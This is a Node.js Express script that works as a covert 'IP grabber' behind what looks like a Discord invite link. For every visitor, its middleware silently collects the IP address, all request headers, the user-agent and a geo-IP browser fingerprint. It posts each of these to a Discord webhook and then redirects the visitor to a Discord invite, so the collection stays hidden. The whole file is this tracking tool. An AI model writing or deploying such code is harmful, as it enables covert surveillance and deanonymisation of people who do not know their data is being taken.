const express = require("express")
const app = express();

const getIP = require('ipware')().get_ip;
const useragent = require('express-useragent')
const fingerprint = require('express-fingerprint')

const { MessageEmbed, WebhookClient } = require('discord.js');
const webhookClient = new WebhookClient({ id:"", token:""});

const embed = new MessageEmbed()
	.setTitle('Some Title')
	.setColor('#0099ff');

const PORT = 8000

app.enable('trust proxy')

app.use(useragent.express());
app.use(fingerprint({
    parameters:[
        fingerprint.useragent,
        fingerprint.acceptHeaders,
        fingerprint.geoip,
 
        function(next) {
            next(null,{
            'param1':'value1'
            })
        },
        function(next) {
            next(null,{
            'param2':'value2'
            })
        },
    ]
}))

app.use((req, res, next) => {
    let ip = getIP(req)

    console.log(ip, req.headers, req.ip, req.socket.remoteAddress, req.useragent, req.fingerprint)

    let a = JSON.stringify(ip)
    let b = JSON.stringify(req.headers)
    let d = JSON.stringify(req.socket.remoteAddress)
    let e = JSON.stringify(req.useragent)
    let f = JSON.stringify(req.fingerprint)

    webhookClient.send({
        content: '``` getIP' + a + '```',
    })
    webhookClient.send({
        content: '``` header' + b + '```',
    })
    webhookClient.send({
        content: '``` sockIP' + d + '```',
    })
    webhookClient.send({
        content: '``` useragent' + e + '```',
    })
    webhookClient.send({
        content: '``` fingerprint' + f + '```',
    })

    next()
})

app.get("/", (req, res) => {
    res.redirect("https://discord.gg/mEeN2p2X")
})

app.listen(PORT, (err) => console.log(err))
